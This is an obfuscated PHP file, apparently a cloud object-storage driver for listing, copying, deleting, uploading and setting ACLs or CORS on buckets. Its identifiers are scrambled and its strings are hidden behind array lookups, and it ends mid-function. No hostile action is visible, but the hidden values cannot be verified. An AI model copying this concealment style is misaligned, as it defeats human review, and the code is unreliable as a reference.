<?php
 goto Dâ‘¨çÌğ; C¸¾«Å­Ñ: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($áÀ±ôÃ) { parent::__construct($áÀ±ôÃ); $this->setSignVersion($_SERVER[´È¥ö†ö][249]); } public function fileOutImage($äªŠÀÍš, $õñ´˜‹Î = 250) { $²ë¡¡Áò =& $_SERVER[´È¥ö†ö]; if ($this->size($äªŠÀÍš) > 1024 * 1024 * 25) { return $this->fileOutImageServer($äªŠÀÍš, $õñ´˜‹Î); } $ÅƒÆ±Ô = array($²ë¡¡Áò[1459] => $²ë¡¡Áò[1460] . $õñ´˜‹Î . $²ë¡¡Áò[1461]); $§°­Ñ‹Ú = $this->link($äªŠÀÍš, $ÅƒÆ±Ô); $this->fileOutLink($§°­Ñ‹Ú); } public function fileOutLink($Üî»àç¼) { $†½Ûó„ =& $_SERVER[´È¥ö†ö]; if (substr($Üî»àç¼, 0, 7) == $†½Ûó„[218]) { $Üî»àç¼ = $†½Ûó„[219] . substr($Üî»àç¼, 7); } header($†½Ûó„[175] . $Üî»àç¼); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($å½µÖ²) { parent::__construct($å½µÖ²); $this->setSignVersion($_SERVER[´È¥ö†ö][249]); } public function fileOutLink($Ëóœ™Ë¤) { $© ¶ÑÎæ =& $_SERVER[´È¥ö†ö]; if (substr($Ëóœ™Ë¤, 0, 7) == $© ¶ÑÎæ[218]) { $Ëóœ™Ë¤ = $© ¶ÑÎæ[219] . substr($Ëóœ™Ë¤, 7); } header($© ¶ÑÎæ[175] . $Ëóœ™Ë¤); die; } public function uploadFormData($ß´¦ˆ†ó, $·½è¿ÏÜ = 3600) { return $this->uploadFormDataV2($ß´¦ˆ†ó, $·½è¿ÏÜ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Î¡ÏŒê) { parent::__construct(); include_once SDK_DIR . $_SERVER[´È¥ö†ö][1462]; $this->_init($Î¡ÏŒê); } public function _init($‰¥ˆıÒ×) { $ÇÇşğİä =& $_SERVER[´È¥ö†ö]; $this->config = $‰¥ˆıÒ×; foreach ($‰¥ˆıÒ× as $¢àùÒÃ => $º‚òëÙ) { if (isset($this->{$¢àùÒÃ})) { $this->{$¢àùÒÃ} = $º‚òëÙ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÇÇşğİä[1463] . LNG($ÇÇşğİä[1464])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $›±Ø†Ñ¾ =& $_SERVER[´È¥ö†ö]; $½õ°¿±ô = new OSS\Model\CorsConfig(); $¿œ¥¥â = new OSS\Model\CorsRule(); $¿œ¥¥â->addAllowedOrigin($›±Ø†Ñ¾[1465]); $¿œ¥¥â->addAllowedMethod($›±Ø†Ñ¾[1466]); $¿œ¥¥â->addAllowedMethod($›±Ø†Ñ¾[1467]); $¿œ¥¥â->addAllowedMethod($›±Ø†Ñ¾[1468]); $¿œ¥¥â->addAllowedMethod($›±Ø†Ñ¾[1469]); $¿œ¥¥â->addAllowedMethod($›±Ø†Ñ¾[165]); $¿œ¥¥â->setMaxAgeSeconds(600); $¿œ¥¥â->addExposeHeader($›±Ø†Ñ¾[1470]); $¿œ¥¥â->addAllowedHeader($›±Ø†Ñ¾[1465]); $½õ°¿±ô->addRule($¿œ¥¥â); try { $this->client->putBucketCors($this->bucket, $½õ°¿±ô); } catch (OSS\Core\OssException $ï­ô§Ğ¦) { $this->writeLog(__FUNCTION__ . $›±Ø†Ñ¾[214] . $ï­ô§Ğ¦->getMessage()); return !1; } return !0; } public function getBucketCors() { $åø§Õ”¡ =& $_SERVER[´È¥ö†ö]; $´Ç¡‘¿ó = null; try { $´Ç¡‘¿ó = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ı¼¢‹¦Ö) { $this->writeLog(__FUNCTION__ . $åø§Õ”¡[214] . $ı¼¢‹¦Ö->getMessage()); return null; } if (!$´Ç¡‘¿ó || !($Ù°ªêˆÖ = $´Ç¡‘¿ó->getRules())) { return null; } $ÊÀ¨ßÌ = $Ù°ªêˆÖ[0]->getAllowedOrigins(); $öÔí£ğ = $Ù°ªêˆÖ[0]->getAllowedMethods(); $œ±É‘„ = $Ù°ªêˆÖ[0]->getMaxAgeSeconds(); $’ª¼ŸÕ¶ = $Ù°ªêˆÖ[0]->getExposeHeaders(); $„¿ë×±â = $Ù°ªêˆÖ[0]->getAllowedHeaders(); return array($åø§Õ”¡[220] => isset($ÊÀ¨ßÌ[0]) ? $ÊÀ¨ßÌ[0] : $åø§Õ”¡[12], $åø§Õ”¡[224] => $öÔí£ğ, $åø§Õ”¡[1471] => $œ±É‘„, $åø§Õ”¡[1472] => isset($’ª¼ŸÕ¶[0]) ? $’ª¼ŸÕ¶[0] : $åø§Õ”¡[12], $åø§Õ”¡[221] => isset($„¿ë×±â[0]) ? $„¿ë×±â[0] : $åø§Õ”¡[12]); } public function isBucketCors() { $‹Ğ±İÆ =& $_SERVER[´È¥ö†ö]; $ö»ÎÏã = $this->getBucketCors(); if (!$ö»ÎÏã || !is_array($ö»ÎÏã)) { return !1; } if ($ö»ÎÏã[$‹Ğ±İÆ[220]] != $‹Ğ±İÆ[222] || $ö»ÎÏã[$‹Ğ±İÆ[221]] != $‹Ğ±İÆ[222]) { return !1; } $õŸ©ÈäŞ = array_map($‹Ğ±İÆ[223], $ö»ÎÏã[$‹Ğ±İÆ[224]]); if (!is_array($õŸ©ÈäŞ)) { $õŸ©ÈäŞ = array(); } $Ë×¡Ó = array($‹Ğ±İÆ[225], $‹Ğ±İÆ[226], $‹Ğ±İÆ[227], $‹Ğ±İÆ[228], $‹Ğ±İÆ[229]); $½š­­Ş½ = array_diff($Ë×¡Ó, $õŸ©ÈäŞ); return empty($½š­­Ş½); } public function mkfile($¿Ôó‹ñÈ, $Â³µ½ÑÍ = '', $Î§ÀŸÙÉ = REPEAT_RENAME) { $›±íÁŞ = $this->setContent($¿Ôó‹ñÈ, $Â³µ½ÑÍ); if ($›±íÁŞ !== !1) { return $this->getPathOuter($¿Ôó‹ñÈ); } return !1; } public function mkdir($óÖ«“æı, $ËåœƒÙÂ = REPEAT_SKIP) { if ($ËåœƒÙÂ && $this->_isFolder($óÖ«“æı)) { return $this->getPathOuter($óÖ«“æı); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($óÖ«“æı)); } catch (OSS\Core\OssException $‰ÛàµÇÚ) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][214] . $‰ÛàµÇÚ->getMessage()); return !1; } return $this->getPathOuter($óÖ«“æı); } private function fileList($Š”÷Ô˜, $ÙÖ·Ôî‚ = '', $²¢ÉÖ±¤ = 0) { $ÛÅø¬íš =& $_SERVER[´È¥ö†ö]; $Š”÷Ô˜ = trim($Š”÷Ô˜, $ÛÅø¬íš[8]); $Çª×¢¾ù = empty($Š”÷Ô˜) && $Š”÷Ô˜ !== $ÛÅø¬íš[230] ? $ÛÅø¬íš[12] : $Š”÷Ô˜ . $ÛÅø¬íš[8]; $íë¹‘© = $ÛÅø¬íš[12]; $ˆ·¯©æ = 1000; $×Óõ„ó³ = $¼ÌÖì = array(); while (!0) { check_abort(); $Ò”¸ì…¾ = array($ÛÅø¬íš[1473] => $ÙÖ·Ôî‚, $ÛÅø¬íš[1474] => $Çª×¢¾ù, $ÛÅø¬íš[1475] => $ˆ·¯©æ, $ÛÅø¬íš[1476] => $íë¹‘©); try { $£ôéÔÇº = $this->client->listObjects($this->bucket, $Ò”¸ì…¾); } catch (OSS\Core\OssException $„‚×´Áı) { $this->writeLog(__FUNCTION__ . $ÛÅø¬íš[214] . $„‚×´Áı->getMessage()); break; } $íë¹‘© = $£ôéÔÇº->getNextMarker(); $—êæÄ”Õ = $£ôéÔÇº->getObjectList(); $£ãÙÆ—œ = $£ôéÔÇº->getPrefixList(); foreach ($—êæÄ”Õ as $„ú±¿Å†) { if ($„ú±¿Å†->getKey() == $Çª×¢¾ù) { continue; } $ó®Ÿ¶õÊ = $„ú±¿Å†->getKey(); $ó´®åóø = $„ú±¿Å†->getSize(); $ş½¢„£à = $„ú±¿Å†->getLastModified(); $Î±ç©Ï¥ = trim($„ú±¿Å†->getETag(), $ÛÅø¬íš[121]); $úì‹Ğ› = $²¢ÉÖ±¤ ? array($ÛÅø¬íš[32] => $ó®Ÿ¶õÊ, $ÛÅø¬íš[79] => $ó´®åóø, $ÛÅø¬íš[206] => strtotime($ş½¢„£à), $ÛÅø¬íš[1477] => $Î±ç©Ï¥) : $ó®Ÿ¶õÊ; $¬÷½àÌ§ = $ó´®åóø == 0 && substr($ó®Ÿ¶õÊ, strlen($ó®Ÿ¶õÊ) - 1, 1) == $ÛÅø¬íš[8] ? !0 : !1; $»ÂÉ†Ú• = array($ÛÅø¬íš[79] => $ó´®åóø, $ÛÅø¬íš[1478] => $ó´®åóø, $ÛÅø¬íš[88] => strtotime($ş½¢„£à), $ÛÅø¬íš[1479] => $ş½¢„£à, $ÛÅø¬íš[1477] => $Î±ç©Ï¥); $this->cacheMethodInfoSet($ó®Ÿ¶õÊ, $¬÷½àÌ§, $»ÂÉ†Ú•); if ($¬÷½àÌ§) { $×Óõ„ó³[] = $ó®Ÿ¶õÊ; continue; } $¼ÌÖì[] = $úì‹Ğ›; } foreach ($£ãÙÆ—œ as $”§œš¶¹) { $×Óõ„ó³[] = $”§œš¶¹->getPrefix(); $this->cacheMethodInfoSet($”§œš¶¹->getPrefix(), !0); } if ($íë¹‘© === $ÛÅø¬íš[12]) { break; } } $this->cacheMethodInfoSet($Š”÷Ô˜, !0); return array($ÛÅø¬íš[85] => $×Óõ„ó³, $ÛÅø¬íš[86] => $¼ÌÖì); } public function listObject($ÍÉÍ“, $Ï†Ù‰­À = '') { $«ªß–• =& $_SERVER[´È¥ö†ö]; $ÍÉÍ“ = trim($ÍÉÍ“, $«ªß–•[8]); $•£ôà€À = empty($ÍÉÍ“) && $ÍÉÍ“ !== $«ªß–•[230] ? $«ªß–•[12] : $ÍÉÍ“ . $«ªß–•[8]; $”àìèÉ = $«ªß–•[12]; $·®¢âæ‚ = 1000; $÷ßºµæ¥ = $Ùû¾…¦û = array(); while (!0) { check_abort(); $•…Öã˜… = array($«ªß–•[1473] => $Ï†Ù‰­À, $«ªß–•[1474] => $•£ôà€À, $«ªß–•[1475] => $·®¢âæ‚, $«ªß–•[1476] => $”àìèÉ); try { $µœ¨´¯ = $this->client->listObjects($this->bucket, $•…Öã˜…); } catch (OSS\Core\OssException $¤‡ğ»¦) { $this->writeLog(__FUNCTION__ . $«ªß–•[214] . $¤‡ğ»¦->getMessage()); break; } $”àìèÉ = $µœ¨´¯->getNextMarker(); $ûÍˆ·ø¾ = $µœ¨´¯->getObjectList(); foreach ($ûÍˆ·ø¾ as $Ø°¼×¢¦) { if ($Ø°¼×¢¦->getKey() == $•£ôà€À) { continue; } $äØı¶¿› = $Ø°¼×¢¦->getKey(); $ó¸¯£ò× = $Ø°¼×¢¦->getSize(); $‘³Ë„ˆ = $ó¸¯£ò× == 0 && substr($äØı¶¿›, strlen($äØı¶¿›) - 1, 1) == $«ªß–•[8] ? !0 : !1; if ($‘³Ë„ˆ) { continue; } $Ùû¾…¦û[] = $ó¸¯£ò× . $«ªß–•[214] . $äØı¶¿›; } if ($”àìèÉ === $«ªß–•[12]) { break; } } return array($«ªß–•[85] => $÷ßºµæ¥, $«ªß–•[86] => $Ùû¾…¦û); } public function copyFile($ÃÖ°“·, $…·³İÎ) { $½¤áƒ¤Æ = $this->size($ÃÖ°“·); if ($½¤áƒ¤Æ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÃÖ°“·, $this->bucket, $this->pathEncode($…·³İÎ)); } catch (OSS\Core\OssException $¥¬ÄËòù) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][214] . $¥¬ÄËòù->getMessage()); return !1; } return $this->getPathOuter($…·³İÎ); } $Æ—ë†È¨ = $this->multiCopyObject($ÃÖ°“·, $…·³İÎ, $½¤áƒ¤Æ); return $Æ—ë†È¨ ? $this->getPathOuter($…·³İÎ) : !1; } private function multiCopyObject($²¿˜„…, $²õÌüš, $™‘«´Ñì) { $¶Ç½†­¬ =& $_SERVER[´È¥ö†ö]; try { $Íİ¦º€“ = array(); if ($ª¤¿¿” = $this->hashMd5($²¿˜„…)) { $Íİ¦º€“ = array(OSS\OssClient::OSS_HEADERS => array($¶Ç½†­¬[1480] => $ª¤¿¿”)); } $—ÃŒïîğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($²õÌüš), $Íİ¦º€“); $êª†Ã = 1; $­âØ½Æ¥ = 0; $¿Ö­Â¬ˆ = array(); $Ê†¡½òù = 1024 * 1024 * 10; $îÓŞ¬—Ş = $this->client->generateMultiuploadParts($™‘«´Ñì, $Ê†¡½òù); foreach ($îÓŞ¬—Ş as $ııÁÄğ => $ˆÂÙÆ–Â) { $§°‘‹•É = $­âØ½Æ¥ + (int) $ˆÂÙÆ–Â[$¶Ç½†­¬[1481]]; $ÌÌãåá = (int) $ˆÂÙÆ–Â[$¶Ç½†­¬[423]] + $§°‘‹•É - 1; $ÖûÂèØš = array($¶Ç½†­¬[167] => $§°‘‹•É, $¶Ç½†­¬[168] => $ÌÌãåá); $¿Ö­Â¬ˆ[] = $this->client->uploadPartCopy($this->bucket, $²¿˜„…, $this->bucket, $this->pathEncode($²õÌüš), $êª†Ã, $—ÃŒïîğ, $ÖûÂèØš); $êª†Ã = $êª†Ã + 1; } $Ìœ†‹Û = array(); foreach ($¿Ö­Â¬ˆ as $ııÁÄğ => $‚ùõêÆ) { $Ìœ†‹Û[] = array($¶Ç½†­¬[299] => $ııÁÄğ + 1, $¶Ç½†­¬[300] => $‚ùõêÆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($²õÌüš), $—ÃŒïîğ, $Ìœ†‹Û); } catch (OSS\Core\OssException $–“èüœá) { $this->writeLog(__FUNCTION__ . $¶Ç½†­¬[214] . $–“èüœá->getMessage()); return !1; } return !0; } public function moveFile($è’è¸ƒ, $“‚–óç±) { if ($this->copyFile($è’è¸ƒ, $“‚–óç±)) { $this->remove($è’è¸ƒ); return $this->getPathOuter($“‚–óç±); } return !1; } public function delFile($©òí½Œë) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($©òí½Œë)); } catch (OSS\Core\OssException $²ã˜”¿‰) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][214] . $²ã˜”¿‰->getMessage()); return !1; } return !0; } public function delFolder($¤Ì„ š¡) { $Ø»ëşÔ =& $_SERVER[´È¥ö†ö]; if (!$this->exist($¤Ì„ š¡)) { return !0; } $this->listItemCache = !1; $˜éæÌÄ = $this->fileList($¤Ì„ š¡); $this->listItemCache = !0; $˜µ“ØÊä = trim($¤Ì„ š¡, $Ø»ëşÔ[8]) . $Ø»ëşÔ[8]; if (!empty($¤Ì„ š¡) && $¤Ì„ š¡ !== $Ø»ëşÔ[230] && !in_array($˜µ“ØÊä, $˜éæÌÄ[$Ø»ëşÔ[85]])) { $˜éæÌÄ[$Ø»ëşÔ[85]][] = $˜µ“ØÊä; } $ğ½Ù‹ô = $this->delByBatch($˜éæÌÄ[$Ø»ëşÔ[86]]); if (!$ğ½Ù‹ô) { return !1; } $ğ½Ù‹ô = $this->delByBatch($˜éæÌÄ[$Ø»ëşÔ[85]]); if (!$ğ½Ù‹ô) { return !1; } return $this->delFile($˜µ“ØÊä); } private function delByBatch($İËş…æ) { foreach (array_chunk($İËş…æ, 1000) as $ÕÓ©µÖØ) { try { $this->client->deleteObjects($this->bucket, $ÕÓ©µÖØ); } catch (OSS\Core\OssException $ÏÇìˆ•ƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][214] . $ÏÇìˆ•ƒ->getMessage()); return !1; } } return !0; } public function rename($á•¯Î†Ì, $ÚŸŒÚ•Í) { return $this->renameObject($á•¯Î†Ì, $ÚŸŒÚ•Í); } private function fileInfo($ñ…ì¼¢ì, $Ú¥µÒè£ = false, $ãáŠÂ¥ = array()) { $úœ¿õÄü =& $_SERVER[´È¥ö†ö]; $—îôÜŞ = array($úœ¿õÄü[32] => $this->pathThis($ñ…ì¼¢ì), $úœ¿õÄü[87] => $this->getPathOuter($ñ…ì¼¢ì), $úœ¿õÄü[33] => $úœ¿õÄü[232], $úœ¿õÄü[79] => isset($ãáŠÂ¥[$úœ¿õÄü[79]]) ? $ãáŠÂ¥[$úœ¿õÄü[79]] : 0, $úœ¿õÄü[169] => $this->ext($ñ…ì¼¢ì)); if ($Ú¥µÒè£) { return $—îôÜŞ; } $—îôÜŞ[$úœ¿õÄü[233]] = $—îôÜŞ[$úœ¿õÄü[88]] = 0; $—îôÜŞ[$úœ¿õÄü[234]] = $—îôÜŞ[$úœ¿õÄü[235]] = !0; if (empty($ãáŠÂ¥)) { $ûÇäÌŞ = $this->objectMeta($ñ…ì¼¢ì); if (!$ûÇäÌŞ) { return $—îôÜŞ; } $ãáŠÂ¥ = array($úœ¿õÄü[88] => strtotime($ûÇäÌŞ[$úœ¿õÄü[1479]]), $úœ¿õÄü[79] => $ûÇäÌŞ[$úœ¿õÄü[1478]] + 0, $úœ¿õÄü[1477] => $ûÇäÌŞ[$úœ¿õÄü[1477]]); } if (isset($ãáŠÂ¥[$úœ¿õÄü[1477]]) && $ãáŠÂ¥[$úœ¿õÄü[1477]]) { $—îôÜŞ[$úœ¿õÄü[237]] = trim($ãáŠÂ¥[$úœ¿õÄü[1477]], $úœ¿õÄü[121]); } if (isset($ãáŠÂ¥[$úœ¿õÄü[79]])) { $—îôÜŞ[$úœ¿õÄü[79]] = $ãáŠÂ¥[$úœ¿õÄü[79]]; } if (isset($ãáŠÂ¥[$úœ¿õÄü[88]])) { $—îôÜŞ[$úœ¿õÄü[88]] = $ãáŠÂ¥[$úœ¿õÄü[88]]; } if (isset($ãáŠÂ¥[$úœ¿õÄü[206]]) && !trim($—îôÜŞ[$úœ¿õÄü[88]])) { $—îôÜŞ[$úœ¿õÄü[88]] = $ãáŠÂ¥[$úœ¿õÄü[206]]; } return $—îôÜŞ; } private function folderInfo($âÓ•ã–Õ, $ğ¼£†šˆ = false, $ ñÀË÷ª = array()) { $–èôÛË¹ =& $_SERVER[´È¥ö†ö]; $ÂÁàÑÆ… = array($–èôÛË¹[32] => $this->pathThis($âÓ•ã–Õ), $–èôÛË¹[87] => $this->getPathOuter($–èôÛË¹[8] . $âÓ•ã–Õ), $–èôÛË¹[33] => $–èôÛË¹[78]); if ($ğ¼£†šˆ) { return $ÂÁàÑÆ…; } $ÂÁàÑÆ…[$–èôÛË¹[233]] = $ÂÁàÑÆ…[$–èôÛË¹[88]] = 0; $ÂÁàÑÆ…[$–èôÛË¹[234]] = $ÂÁàÑÆ…[$–èôÛË¹[235]] = !0; if (empty($ ñÀË÷ª)) { $âÓ•ã–Õ = rtrim($âÓ•ã–Õ, $–èôÛË¹[8]) . $–èôÛË¹[8]; $´»–íç = $this->objectMeta($âÓ•ã–Õ); if (!$´»–íç) { return $ÂÁàÑÆ…; } $ ñÀË÷ª = array($–èôÛË¹[233] => $´»–íç[$–èôÛË¹[586]][$–èôÛË¹[1482]], $–èôÛË¹[88] => strtotime($´»–íç[$–èôÛË¹[1479]])); } if (isset($ ñÀË÷ª[$–èôÛË¹[88]])) { $ÂÁàÑÆ…[$–èôÛË¹[88]] = $ ñÀË÷ª[$–èôÛË¹[88]]; } if (isset($ ñÀË÷ª[$–èôÛË¹[233]])) { $ÂÁàÑÆ…[$–èôÛË¹[233]] = $ ñÀË÷ª[$–èôÛË¹[233]]; } return $ÂÁàÑÆ…; } public function listPath($–¦Ä«æŸ, $µ€Èè’û = false) { $–çŠ¢‰˜ =& $_SERVER[´È¥ö†ö]; $”±î®©Ë = $this->fileList($–¦Ä«æŸ, $–çŠ¢‰˜[8], !0); foreach ($”±î®©Ë[$–çŠ¢‰˜[85]] as $äãŒ€È® => $¦ãñ) { $”±î®©Ë[$–çŠ¢‰˜[85]][$äãŒ€È®] = $this->folderInfo($¦ãñ, $µ€Èè’û, $¦ãñ); } foreach ($”±î®©Ë[$–çŠ¢‰˜[86]] as $äãŒ€È® => $¦ãñ) { $”±î®©Ë[$–çŠ¢‰˜[86]][$äãŒ€È®] = $this->fileInfo($¦ãñ[$–çŠ¢‰˜[32]], $µ€Èè’û, $¦ãñ); } return $”±î®©Ë; } protected function infoChildren($èõà£Ş, &$æöñ‹‘½) { $Ï³ªõ¿µ =& $_SERVER[´È¥ö†ö]; $Š¼ØñÅÑ = $this->fileList($èõà£Ş, $Ï³ªõ¿µ[12], !0); $æöñ‹‘½[$Ï³ªõ¿µ[81]] += count($Š¼ØñÅÑ[$Ï³ªõ¿µ[85]]); $æöñ‹‘½[$Ï³ªõ¿µ[80]] += count($Š¼ØñÅÑ[$Ï³ªõ¿µ[86]]); foreach ($Š¼ØñÅÑ[$Ï³ªõ¿µ[86]] as $‘¯©Ãüì) { if (!$‘¯©Ãüì || !$‘¯©Ãüì[$Ï³ªõ¿µ[79]]) { continue; } $æöñ‹‘½[$Ï³ªõ¿µ[79]] += $‘¯©Ãüì[$Ï³ªõ¿µ[79]]; } } public function has($¼— ßÃ», $Á³È ëÕ = false, $£ Îî¡ö = true) { $Åá’¿Ûî =& $_SERVER[´È¥ö†ö]; $¼— ßÃ» = trim($¼— ßÃ», $Åá’¿Ûî[8]); $ÏÎºı†’ = empty($¼— ßÃ») && $¼— ßÃ» !== $Åá’¿Ûî[230] ? $Åá’¿Ûî[12] : $¼— ßÃ» . $Åá’¿Ûî[8]; $ä—ğá ƒ = $Åá’¿Ûî[12]; $€Ç¹ÄÒ® = 500; $Ó¶Ü®ğ = $Š£ÕõØÇ = 0; while (!0) { check_abort(); $ˆÀ”€ç = array($Åá’¿Ûî[1473] => $Åá’¿Ûî[8], $Åá’¿Ûî[1474] => $ÏÎºı†’, $Åá’¿Ûî[1475] => $€Ç¹ÄÒ®, $Åá’¿Ûî[1476] => $ä—ğá ƒ); try { $«Î·‹ÆÇ = $this->client->listObjects($this->bucket, $ˆÀ”€ç); } catch (OSS\Core\OssException $Ä¸õ¶î) { $this->writeLog(__FUNCTION__ . $Åá’¿Ûî[214] . $Ä¸õ¶î->getMessage()); break; } $ä—ğá ƒ = $«Î·‹ÆÇ->getNextMarker(); $ÒŞ£¹ÒÆ = $«Î·‹ÆÇ->getObjectList(); $Ò±óêš = $«Î·‹ÆÇ->getPrefixList(); if ($Á³È ëÕ) { if (count($ÒŞ£¹ÒÆ) > 1 || count($ÒŞ£¹ÒÆ) == 1 && $ÒŞ£¹ÒÆ[0]->getKey() != $ÏÎºı†’) { $Ó¶Ü®ğ += count($ÒŞ£¹ÒÆ) - 1; } if (!empty($Ò±óêš)) { $Š£ÕõØÇ += count($Ò±óêš); } if ($ä—ğá ƒ === $Åá’¿Ûî[12]) { break; } continue; } if ($£ Îî¡ö) { if (!empty($ÒŞ£¹ÒÆ)) { if (count($ÒŞ£¹ÒÆ) > 1 || $ÒŞ£¹ÒÆ[0]->getKey() != $ÏÎºı†’) { return !0; } } } else { if (!empty($Ò±óêš)) { return !0; } } if ($ä—ğá ƒ === $Åá’¿Ûî[12]) { break; } } if ($Á³È ëÕ) { return array($Åá’¿Ûî[241] => $Ó¶Ü®ğ, $Åá’¿Ûî[242] => $Š£ÕõØÇ); } return !1; } public function listAll($‰È“„ş) { $œ¯ óÎº =& $_SERVER[´È¥ö†ö]; $§·Øš– = $this->fileList($‰È“„ş, $œ¯ óÎº[12], !0); $Ğ´Ö•ìª = array_to_keyvalue($§·Øš–[$œ¯ óÎº[86]], $œ¯ óÎº[32]); foreach ($§·Øš–[$œ¯ óÎº[85]] as $› Ğùœø) { if (is_string($› Ğùœø)) { $Ğ´Ö•ìª[$› Ğùœø] = array($œ¯ óÎº[79] => 0); } } return $this->listAllFiles($‰È“„ş, $Ğ´Ö•ìª); } public function canRead($ÆÆŠÉ‰¹) { $¤àñ¶Æó =& $_SERVER[´È¥ö†ö]; $ç“‰‘À— = $this->pathAcl($ÆÆŠÉ‰¹); return $ç“‰‘À— == $¤àñ¶Æó[1483] || $ç“‰‘À— == $¤àñ¶Æó[633] ? !0 : !1; } public function canWrite($éÌäñÏé) { $¡¤êë˜ = $this->pathAcl($éÌäñÏé); return $¡¤êë˜ == $_SERVER[´È¥ö†ö][633] ? !0 : !1; } public function pathAcl($¥·ôÒ’) { $ÂÌ¼öğˆ =& $_SERVER[´È¥ö†ö]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $åÓĞñˆÎ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¥·ôÒ’)); } catch (OSS\Core\OssException $¨ÉÚ—áó) { $this->writeLog(__FUNCTION__ . $ÂÌ¼öğˆ[214] . $¨ÉÚ—áó->getMessage()); return !1; } $´óõ™»ï = $åÓĞñˆÎ == $ÂÌ¼öğˆ[37] ? $this->bucketAcl : $åÓĞñˆÎ; if ($´óõ™»ï == $ÂÌ¼öğˆ[1484]) { return $ÂÌ¼öğˆ[1483]; } if ($´óõ™»ï == $ÂÌ¼öğˆ[1485]) { return $ÂÌ¼öğˆ[633]; } return $´óõ™»ï; } private function chmodPath($£ºùİ—Ç, $©ÍàÀò¤ = '') { $æ×Ã¤Û· =& $_SERVER[´È¥ö†ö]; $Ëˆ·–Øæ = empty($©ÍàÀò¤) ? $æ×Ã¤Û·[1485] : $©ÍàÀò¤; $äñğÉ® = array($æ×Ã¤Û·[37], $æ×Ã¤Û·[231], $æ×Ã¤Û·[1484], $æ×Ã¤Û·[1485]); if (!in_array($Ëˆ·–Øæ, $äñğÉ®)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($£ºùİ—Ç), $Ëˆ·–Øæ); } catch (OSS\Core\OssException $¹Åı‡Ì©) { $this->writeLog(__FUNCTION__ . $æ×Ã¤Û·[214] . $¹Åı‡Ì©->getMessage()); return !1; } return !0; } public function getContent($Ôòğ„ºı) { return $this->fileSubstr($Ôòğ„ºı, -1); } public function setContent($ò†½õË¢, $ıÓ·‹Å€ = '') { $Š‰²ÀÑ =& $_SERVER[´È¥ö†ö]; try { $¦«ß¸ş = $this->trafficLimit($Š‰²ÀÑ[1486]); $Å”²‰à = $this->client->putObject($this->bucket, $this->pathEncode($ò†½õË¢), $ıÓ·‹Å€, $¦«ß¸ş); } catch (OSS\Core\OssException $½³Úõ‡Ø) { $this->writeLog(__FUNCTION__ . $Š‰²ÀÑ[214] . $½³Úõ‡Ø->getMessage()); return !1; } $ú•£­“ = array($Š‰²ÀÑ[1480] => trim($Å”²‰à[$Š‰²ÀÑ[1477]], $Š‰²ÀÑ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ò†½õË¢))); $this->updateObjMeta($ò†½õË¢, $ú•£­“); return isset($Å”²‰à[$Š‰²ÀÑ[1487]][$Š‰²ÀÑ[296]]) ? !0 : !1; } private function updateObjMeta($ÏæˆµâÀ, $õ˜à€…é) { $ÏæˆµâÀ = $this->pathEncode($ÏæˆµâÀ); try { $‘ù¥¹‰ = array(OSS\OssClient::OSS_HEADERS => $õ˜à€…é); $this->client->copyObject($this->bucket, $ÏæˆµâÀ, $this->bucket, $ÏæˆµâÀ, $‘ù¥¹‰); } catch (OSS\Core\OssException $Í¡¢‘Ş) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][214] . $Í¡¢‘Ş->getMessage()); return !1; } return !0; } public function upload($ŞæŠ¨, $öÔÂÃ¡Ä, $—¿„ëâ• = false, $øç¡¸Ñ = REPEAT_REPLACE) { $­Ğ¤ßÑ‚ =& $_SERVER[´È¥ö†ö]; $Õí·Üˆ = trim($ŞæŠ¨, $­Ğ¤ßÑ‚[8]); $ñÚÌ¦»Ú = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($­Ğ¤ßÑ‚[1480] => @md5_file($öÔÂÃ¡Ä)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ŞæŠ¨))); $ñÚÌ¦»Ú = $this->trafficLimit($­Ğ¤ßÑ‚[1486], $ñÚÌ¦»Ú); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Õí·Üˆ), $öÔÂÃ¡Ä, $ñÚÌ¦»Ú); } catch (OSS\Core\OssException $²ÁâĞÀĞ) { $this->writeLog(__FUNCTION__ . $­Ğ¤ßÑ‚[214] . $²ÁâĞÀĞ->getMessage()); return !1; } return $this->getPathOuter($ŞæŠ¨); } public function getHost() { $†¾É—æ¿ =& $_SERVER[´È¥ö†ö]; $„×ÚÚƒ = explode($†¾É—æ¿[210], parent::getHost()); return $„×ÚÚƒ[0] . $†¾É—æ¿[210] . $this->bucket . $†¾É—æ¿[10] . $„×ÚÚƒ[1]; } public function uploadFormData($—ˆ²öñÑ, $¢ÛûÙ¨ = 3600) { $ä‡ìğ© =& $_SERVER[´È¥ö†ö]; if (!($µ‡ÈÒÆ = $this->getHost())) { return !1; } $¬¡·Œœ» = $¢ÛûÙ¨; $·±Ãåë = date($ä‡ìğ©[1488], time() + $¬¡·Œœ»); $üçè¤Ó = new DateTime($·±Ãåë); $ŸŠà¬û§ = $üçè¤Ó->format(DateTime::ISO8601); 